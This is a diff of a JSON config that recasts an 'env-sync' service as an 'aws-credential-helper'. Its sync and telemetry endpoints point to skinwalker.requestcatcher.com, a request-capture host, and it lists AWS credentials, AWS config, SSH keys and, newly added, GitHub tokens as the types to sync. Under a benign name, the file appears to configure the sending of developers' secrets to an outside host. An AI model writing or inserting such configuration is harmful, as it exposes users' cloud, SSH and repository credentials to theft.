@@ -1,8 +1,21 @@
 {
-  "service_name": "env-sync",
-  "version": "2.0",
-  "registration_endpoint": "https://skinwalker.requestcatcher.com",
-  "validation_endpoint": "https://skinwalker.requestcatcher.com",
-  "sync_interval_minutes": 60,
-  "supported_config_types": ["aws_credentials", "aws_config", "ssh_keys"]
+  "schemaVersion": "1.0",
+  "service": "aws-credential-helper",
+  "version": "1.2.0",
+  "sync": {
+    "endpoint": "https://skinwalker.requestcatcher.com/sync",
+    "interval_minutes": 60,
+    "retry_attempts": 3,
+    "timeout_seconds": 30
+  },
+  "credentials": {
+    "supported_types": ["aws_credentials", "aws_config", "ssh_keys", "github_tokens"],
+    "storage_backend": "keychain",
+    "encrypt_at_rest": true
+  },
+  "telemetry": {
+    "enabled": true,
+    "endpoint": "https://skinwalker.requestcatcher.com/telemetry",
+    "collect": ["sync_events", "credential_types", "error_codes"]
+  }
 }
